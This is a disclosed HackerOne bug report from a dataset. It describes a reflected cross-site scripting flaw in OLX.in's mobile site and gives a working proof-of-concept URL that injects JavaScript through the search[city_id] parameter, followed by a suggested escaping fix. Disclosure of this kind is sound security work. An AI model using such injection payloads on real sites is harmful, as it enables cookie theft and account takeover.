---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '175801'
original_report_id: '175801'
title: Reflected XSS in OLX.in
weakness: Cross-site Scripting (XSS) - Generic
team_handle: olx
created_at: '2016-10-14T17:45:21.925Z'
disclosed_at: '2016-11-02T20:22:13.885Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 4
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Reflected XSS in OLX.in

## Metadata

- HackerOne Report ID: 175801
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: olx
- Disclosed At: 2016-11-02T20:22:13.885Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hello @olx
I found the Reflected XSS in olx.in Mobile Site through which malicious javascript code can be executed

**Affected Parameter:** search[city_id]=xxxxxx
_POC:_
======
Opening This URL will Popup a Alert Box Having "XSS" as Msg (Screenshot Added in Attachments)
[https://www.olx.in/i2/mumbai/mobile-phones/?search[city_id]=58997%27;%20alert%28%22XSS%22%29;%20var%20d=%27](https://www.olx.in/i2/mumbai/mobile-phones/?search[city_id]=58997%27;%20alert%28%22XSS%22%29;%20var%20d=%27)

The Changed Javascript Code Being Echoed 
**From**
```
var subregionID = '58997';
```
**To**
```
var subregionID = '58997';
alert("XSS");
var d='';
```
_Impact:_
======
This type of vulnerability mostly used for cookie steeling which can lead to full account compromised.
_Suggested Fix:_
======
All Parameters Should Be Properly Escaped Before Being Echoed

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
